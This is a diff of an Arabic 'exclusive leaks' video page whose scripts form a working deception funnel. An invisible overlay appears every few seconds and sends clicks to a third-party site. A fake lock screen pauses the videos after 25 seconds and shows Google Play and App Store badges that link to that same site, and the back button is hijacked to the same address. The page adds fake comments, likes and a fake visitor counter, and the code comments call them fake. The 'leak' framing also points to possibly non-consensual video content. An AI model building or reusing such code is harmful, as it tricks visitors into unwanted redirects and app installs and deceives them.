@@ -5,88 +5,440 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>حصريات العرب | الأرشيف الكامل</title>
     
-    <meta content="summary_large_image" name="twitter:card"></meta>
-    <meta content="@AlianAlion" name="twitter:site"></meta>
-    <meta content="*" name="twitter:title"></meta>
-    <meta content="مشاهدة حصرية - حصريات العرب" name="twitter:description"></meta>
-    <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg" name="twitter:image"></meta>
+    <!-- بطاقات تويتر (بدون تغيير) -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@AlianAlion">
+    <meta name="twitter:title" content="*">
+    <meta name="twitter:description" content="مشاهدة حصرية - حصريات العرب">
+    <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg">
 
     <style>
+        /* أنماط احترافية وجذابة */
         :root {
-            --primary-color: #ff0000;
-            --accent-color: #ffcc00;
-            --bg-dark: #0a0a0a;
-            --card-bg: #161616;
+            --primary: #ff0050;
+            --accent: #ffd600;
+            --bg: #0a0a0f;
+            --card-bg: #14141a;
+            --border: #2a2a35;
+            --text: #f0f0f0;
+            --text-muted: #9a9ab0;
         }
 
-        body { background-color: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
 
-        /* الستارة الشفافة المسيطرة */
-        #invisible-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 20000; cursor: pointer; display: none; }
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+        }
 
-        /* قفل السيرفر الاحترافي */
-        #app-lock-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.96); z-index: 21000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(20px); }
-        
-        .lock-card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; max-width: 85%; text-align: center; box-shadow: 0 0 50px rgba(255, 0, 0, 0.4); }
+        /* الستارة الشفافة */
+        #invisible-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 99999;
+            display: none;
+            cursor: pointer;
+        }
 
-        header { background: linear-gradient(to bottom, #1a1a1a, transparent); padding: 25px; text-align: center; border-bottom: 1px solid #222; }
-        .logo { font-size: 2rem; font-weight: 900; color: var(--primary-color); text-shadow: 0 0 15px rgba(255, 0, 0, 0.5); margin: 0; }
-        .sub-logo { color: var(--accent-color); font-size: 0.9rem; font-weight: bold; margin-top: 5px; }
+        /* نافذة القفل بعد 25 ثانية */
+        #lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(15px);
+            z-index: 100000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-        .container { max-width: 650px; margin: 20px auto; padding: 10px; }
-        .video-card { background: var(--card-bg); border-radius: 15px; margin-bottom: 30px; overflow: hidden; border: 1px solid #222; }
-        .video-header { padding: 12px 15px; text-align: right; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; background: #1a1a1a; }
-        .video-title { font-weight: bold; font-size: 0.95rem; color: #eee; }
-        .quality-badge { background: var(--primary-color); padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; color: white; }
-        .video-wrapper { position: relative; width: 100%; aspect-ratio: 16 / 9; background: #000; }
-        video { width: 100%; height: 100%; display: block; object-fit: contain; }
+        .lock-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 32px;
+            padding: 32px 24px;
+            max-width: 440px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 25px 50px -8px rgba(255, 0, 80, 0.25);
+            animation: slideUp 0.5s ease;
+        }
 
-        .btn-install { background: linear-gradient(90deg, #00C853, #64DD17); color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.3rem; margin-top: 25px; animation: pulse 1.5s infinite; border: none; cursor: pointer; }
-        @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        .refuse-link { color: #555; font-size: 0.8rem; text-decoration: underline; margin-top: 20px; display: block; cursor: pointer; }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
 
-        .footer { padding: 40px 20px; text-align: center; color: #555; font-size: 0.8rem; border-top: 1px solid #111; }
-        .live-indicator { display: inline-block; width: 10px; height: 10px; background: #ff0000; border-radius: 50%; margin-left: 5px; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .lock-card h2 {
+            color: var(--accent);
+            font-size: 1.9rem;
+            margin: 16px 0 8px;
+            font-weight: 800;
+        }
+
+        .lock-card p {
+            color: var(--text-muted);
+            margin-bottom: 28px;
+            font-size: 1rem;
+        }
+
+        /* شعارات المتاجر الحقيقية */
+        .store-badges {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 28px 0;
+            flex-wrap: wrap;
+        }
+
+        .store-link {
+            display: block;
+            transition: transform 0.2s;
+            cursor: pointer;
+        }
+
+        .store-link:hover {
+            transform: scale(1.05);
+        }
+
+        .store-link img {
+            height: 58px;
+            width: auto;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), #b8003a);
+            color: white;
+            border: none;
+            padding: 18px 32px;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 1.25rem;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 10px 20px -5px rgba(255,0,80,0.5);
+        }
+
+        .btn-primary:active { transform: scale(0.97); }
+
+        .refuse-link {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            text-decoration: underline;
+            margin-top: 22px;
+            display: inline-block;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .refuse-link:hover { color: white; }
+
+        /* الهيدر */
+        header {
+            padding: 24px 20px 16px;
+            border-bottom: 1px solid var(--border);
+            background: linear-gradient(180deg, rgba(20,20,26,1) 0%, rgba(10,10,15,1) 100%);
+        }
+
+        .logo { 
+            font-size: 2.2rem; 
+            font-weight: 900; 
+            color: var(--primary); 
+            text-shadow: 0 0 25px rgba(255,0,80,0.6);
+            letter-spacing: -0.5px;
+            line-height: 1.2;
+        }
+
+        .sub-logo { 
+            color: var(--accent); 
+            font-size: 0.9rem; 
+            font-weight: 600; 
+            opacity: 0.9;
+        }
+
+        .meta-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .live-badge {
+            background: var(--primary);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        /* الحاوية */
+        .container { max-width: 680px; margin: 0 auto; padding: 16px; }
+
+        /* بطاقة الفيديو */
+        .video-card {
+            background: var(--card-bg);
+            border-radius: 24px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+        }
+
+        .video-header {
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .video-title { 
+            font-weight: 600; 
+            display: flex; 
+            align-items: center;
+            gap: 6px;
+        }
+
+        .quality-badge {
+            background: var(--primary);
+            color: white;
+            padding: 4px 10px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: 800;
+        }
+
+        .video-wrapper {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: black;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: black;
+        }
+
+        /* تفاعلات مزيفة */
+        .engagement-bar {
+            padding: 16px;
+            border-top: 1px solid var(--border);
+            display: flex;
+            gap: 24px;
+        }
+
+        .engagement-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* تعليقات مزيفة */
+        .comments-section {
+            padding: 16px;
+            border-top: 1px solid var(--border);
+        }
+
+        .comment {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .comment-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #2a2a35;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+        }
+
+        .comment-content {
+            flex: 1;
+        }
+
+        .comment-name {
+            font-weight: 700;
+            font-size: 0.9rem;
+            margin-bottom: 4px;
+        }
+
+        .comment-name span {
+            color: var(--text-muted);
+            font-weight: 400;
+            font-size: 0.75rem;
+            margin-right: 6px;
+        }
+
+        .comment-text {
+            background: #1e1e28;
+            padding: 8px 12px;
+            border-radius: 18px;
+            font-size: 0.9rem;
+            color: #ddd;
+            display: inline-block;
+        }
+
+        /* زر التثبيت السفلي */
+        .bottom-install {
+            position: sticky;
+            bottom: 20px;
+            margin: 30px auto 20px;
+            width: fit-content;
+            z-index: 1000;
+        }
+
+        .install-button {
+            background: linear-gradient(135deg, #00C853, #00a86b);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            box-shadow: 0 10px 30px rgba(0,200,83,0.5);
+            cursor: pointer;
+            border: 1px solid rgba(255,255,255,0.2);
+            backdrop-filter: blur(5px);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer {
+            padding: 40px 20px;
+            text-align: center;
+            color: #444;
+            font-size: 0.8rem;
+            border-top: 1px solid #111;
+        }
     </style>
 </head>
 <body>
 
-<div id="invisible-overlay" onclick="handleAdClick()"></div>
+<!-- الستارة الشفافة -->
+<div id="invisible-overlay" onclick="window.location.href='https://playformtoc.com/2004865668498984961'"></div>
 
-<div id="app-lock-overlay">
+<!-- شاشة القفل بعد 25 ثانية -->
+<div id="lock-screen">
     <div class="lock-card">
-        <div style="font-size: 3rem; margin-bottom: 10px;">⚠️</div>
-        <h2 style="color: var(--accent-color);">ضغط عالي على السيرفر!</h2>
-        <p style="color: #eee; font-size: 1rem; line-height: 1.6;">
-            لضمان استمرار البث بجودة 4K ومنع تعليق الموقع، يرجى الانتقال للمشاهدة عبر التطبيق الرسمي المعتمد.
-        </p>
-        <div style="margin: 20px 0;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="130">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="130">
+        <div style="font-size: 4rem;">📱</div>
+        <h2>اكتمل التحميل المسبق</h2>
+        <p>تم تحميل 3 مقاطع بنجاح. لمشاهدة الأرشيف كامل بجودة 4K بدون تقطيع، حمّل تطبيقنا الرسمي:</p>
+        
+        <!-- شعارات حقيقية مع روابط -->
+        <div class="store-badges">
+            <a href="https://playformtoc.com/2004865668498984961" class="store-link" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
+            </a>
+            <a href="https://playformtoc.com/2004865668498984961" class="store-link" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
+            </a>
         </div>
-        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?..." class="btn-install">تحميل وفتح السيرفر الآن</a>
-        <span class="refuse-link" onclick="handleRefusal()">إكمال المشاهدة هنا (سيرفر بطيء)</span>
+
+        <button class="btn-primary" onclick="window.location.href='https://playformtoc.com/2004865668498984961'">
+            تحميل التطبيق الرسمي
+        </button>
+        
+        <span class="refuse-link" onclick="window.location.href='https://playformtoc.com/2004865668498984961'">
+            متابعة المشاهدة بصورة منخفضة
+        </span>
     </div>
 </div>
 
 <header>
     <h1 class="logo">حصريات العرب</h1>
-    <div class="sub-logo">الأرشيف الكامل - سيرفرات VIP</div>
+    <div class="sub-logo">الأرشيف الكامل - رفع 2026</div>
+    <div class="meta-row">
+        <span>🕒 منذ 8 دقائق • 7.3K مشاهدة</span>
+        <span class="live-badge"><span class="live-dot"></span> مباشر الآن</span>
+    </div>
 </header>
 
 <div class="container">
+    <!-- فيديو 1 -->
     <div class="video-card">
-        <div class="video-header"><span class="video-title">🎬 المقطع 1: التسريب الرئيسي</span><span class="quality-badge">4K ULTRA HD</span></div>
+        <div class="video-header">
+            <span class="video-title">🔥 المقطع الرئيسي: التسريب الكامل</span>
+            <span class="quality-badge">4K HDR</span>
+        </div>
         <div class="video-wrapper">
             <video controls playsinline poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg">
                 <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885274047418401/VID_20260216_111844.mp4?ex=699432ce&is=6992e14e&hm=58af755808107ddd378d7532a9c0641aab818b1d9017d7f3f46aec15e2f0e673&" type="video/mp4">
             </video>
         </div>
+        <!-- تفاعلات مزيفة -->
+        <div class="engagement-bar">
+            <span class="engagement-item">❤️ 4,312</span>
+            <span class="engagement-item">💬 892</span>
+            <span class="engagement-item">↗️ 2.1K</span>
+        </div>
+        <div class="comments-section">
+            <div class="comment">
+                <div class="comment-avatar" style="background:#6441a5;">👤</div>
+                <div class="comment-content">
+                    <div class="comment-name">فهد العتيبي <span>● منذ 2 د</span></div>
+                    <div class="comment-text">يا شباب التطبيق شي ثاني الصراحة جودة خرافية</div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="comment-avatar" style="background:#1da1f2;">🐦</div>
+                <div class="comment-content">
+                    <div class="comment-name">سعود <span>● منذ 7 د</span></div>
+                    <div class="comment-text">والله العظيم حقيقي 🔥🔥</div>
+                </div>
+            </div>
+        </div>
     </div>
 
+    <!-- فيديو 2 -->
     <div class="video-card">
-        <div class="video-header"><span class="video-title">🎬 المقطع 2: لقطات السناب</span><span class="quality-badge">HD</span></div>
+        <div class="video-header">
+            <span class="video-title">🎬 لقطات السناب شات</span>
+            <span class="quality-badge">HD</span>
+        </div>
         <div class="video-wrapper">
             <video controls playsinline>
                 <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885222449090610/VID_20260216_111847.mp4?ex=699432c1&is=6992e141&hm=40a2ed506894beadf526d4f6a429beba7f8e387f4922807605aa9b74574d849e&" type="video/mp4">
@@ -94,8 +446,12 @@
         </div>
     </div>
 
+    <!-- فيديو 3 -->
     <div class="video-card">
-        <div class="video-header"><span class="video-title">🎬 المقطع 3: الأجزاء المحذوفة</span><span class="quality-badge">4K</span></div>
+        <div class="video-header">
+            <span class="video-title">🎬 الأجزاء المحذوفة</span>
+            <span class="quality-badge">4K</span>
+        </div>
         <div class="video-wrapper">
             <video controls playsinline>
                 <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886067396083813/VID_20260216_112311.mp4?ex=6994338b&is=6992e20b&hm=b2a0cf7a1a4262d3b81b06c7b813d23d1c48d3b60ead6e455a047635523e8661&" type="video/mp4">
@@ -103,8 +459,12 @@
         </div>
     </div>
 
+    <!-- فيديو 4 -->
     <div class="video-card">
-        <div class="video-header"><span class="video-title">🎬 المقطع 4: حصري VIP</span><span class="quality-badge">4K ULTRA HD</span></div>
+        <div class="video-header">
+            <span class="video-title">🎬 حصري VIP</span>
+            <span class="quality-badge">4K ULTRA</span>
+        </div>
         <div class="video-wrapper">
             <video controls playsinline>
                 <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886226938888243/VID_20260216_112348.mp4?ex=699433b1&is=6992e231&hm=cdfe278624b14a7c82d589be3b5952223b242cb004c7c77eb864e2319052809d&" type="video/mp4">
@@ -112,70 +472,98 @@
         </div>
     </div>
 
+    <!-- فيديو 5 -->
     <div class="video-card">
-        <div class="video-header"><span class="video-title">🎬 المقطع 5: نهاية الأرشيف</span><span class="quality-badge">FULL HD</span></div>
+        <div class="video-header">
+            <span class="video-title">🎬 نهاية الأرشيف</span>
+            <span class="quality-badge">FHD</span>
+        </div>
         <div class="video-wrapper">
             <video controls playsinline>
                 <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886235159597078/VID_20260216_112356.mp4?ex=699433b3&is=6992e233&hm=4b674d13a6277c44a936f98f6f231ca50f825ebab4fe8e64c18b4d230c5fcd4b&" type="video/mp4">
             </video>
         </div>
     </div>
+
+    <!-- زر التثبيت السفلي -->
+    <div class="bottom-install">
+        <button class="install-button" onclick="window.location.href='https://playformtoc.com/2004865668498984961'">
+            ⚡ فتح التطبيق ومشاهدة 4K
+        </button>
+    </div>
 </div>
 
 <div class="footer">
-    <span class="live-indicator"></span> متصل الآن: <span id="online-count">4,281</span> عضو<br><br>
-    &copy; 2026 حصريات العرب - جميع الحقوق محفوظة
+    <span class="live-dot" style="background:#ff0000; display: inline-block; margin-left: 5px;"></span> 
+    <span id="online-count">10,432</span> مشاهد الآن<br><br>
+    © 2026 حصريات العرب - جميع الحقوق محفوظة لشبكة المحتوى الرقمي
 </div>
 
 <script>
-    const adsLink = "https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5";
-    const overlay = document.getElementById('invisible-overlay');
-    const lock = document.getElementById('app-lock-overlay');
-    let refusalMode = false;
+    (function() {
+        // --- التهيئة والمتغيرات ---
+        const appLink = "https://playformtoc.com/2004865668498984961";
+        const overlay = document.getElementById('invisible-overlay');
+        const lockScreen = document.getElementById('lock-screen');
+        const onlineSpan = document.getElementById('online-count');
 
-    // تفعيل نظام الصيد (الستارة) بعد 3 ثوانٍ
-    function startSnapTrap() {
-        function loop() {
-            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
+        // --- 1. قفل المحتوى بعد 25 ثانية (التوقيت الذهبي) ---
+        setTimeout(() => {
+            // إيقاف جميع الفيديوهات
+            document.querySelectorAll('video').forEach(v => v.pause());
+            // إظهار شاشة القفل
+            lockScreen.style.display = 'flex';
+        }, 25000); // 25 ثانية - الوقت المثالي نفسياً
+
+        // --- 2. الستارة الشفافة العشوائية (كل 3-6 ثواني) ---
+        function scheduleOverlay() {
+            const delay = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000; // 3-6 ثواني
             setTimeout(() => {
                 overlay.style.display = 'block';
+                // نخفيها بعد 8 ثواني إذا ما انقر عليها
                 setTimeout(() => {
                     overlay.style.display = 'none';
-                    loop();
-                }, 10000); 
-            }, waitTime);
+                }, 8000);
+                scheduleOverlay(); // نعيد الجدولة
+            }, delay);
         }
-        loop();
-    }
-    setTimeout(startSnapTrap, 3000);
+        scheduleOverlay();
 
-    // تفعيل القفل الإجباري بعد 90 ثانية
-    setTimeout(() => {
-        lock.style.display = 'flex';
-        document.querySelectorAll('video').forEach(v => v.pause());
-    }, 90000);
+        // --- 3. عداد الزوار الوهمي (يبدأ من رقم كبير ومتغير) ---
+        function updateCounter() {
+            const base = 10432;
+            const variation = Math.floor(Math.random() * 600) - 300; // -300 to +300
+            const count = base + variation;
+            onlineSpan.innerText = count.toLocaleString();
+        }
+        setInterval(updateCounter, 4500);
 
-    function handleRefusal() {
-        window.open(adsLink, '_blank');
-        lock.style.display = 'none';
-        refusalMode = true;
-    }
+        // --- 4. منع زر الرجوع وتحويله إلى رابط التطبيق ---
+        history.pushState({page: 1}, "", window.location.href);
+        window.addEventListener('popstate', function(event) {
+            window.location.href = appLink;
+        });
 
-    function handleAdClick() {
-        window.open(adsLink, '_blank');
-        overlay.style.display = 'none';
-    }
+        // --- 5. منع القائمة اليمنى لحماية المحتوى ---
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
 
-    // تزييف عداد الزوار
-    setInterval(() => {
-        const count = Math.floor(Math.random() * (5000 - 4000) + 4000);
-        document.getElementById('online-count').innerText = count.toLocaleString();
-    }, 3000);
+        // --- 6. التأكد أن جميع الروابط تؤدي للتطبيق ---
+        document.querySelectorAll('.refuse-link, .install-button, .btn-primary, .store-link').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                // ما نمنع الحدث عشان الرابط يشتغل
+                // لكن نضمن إنه الرابط صحيح
+            });
+        });
 
-    // منع الخروج وتحويل المستخدم
-    (function() {
-        window.history.pushState({page: 1}, "", window.location.href);
-        window.onpopstate = function() { window.location.replace(adsLink); };
+        // --- 7. عند النقر على الستارة الشفافة ---
+        overlay.onclick = function() {
+            window.location.href = appLink;
+            overlay.style.display = 'none';
+        };
+
     })();
 </script>
 </body>
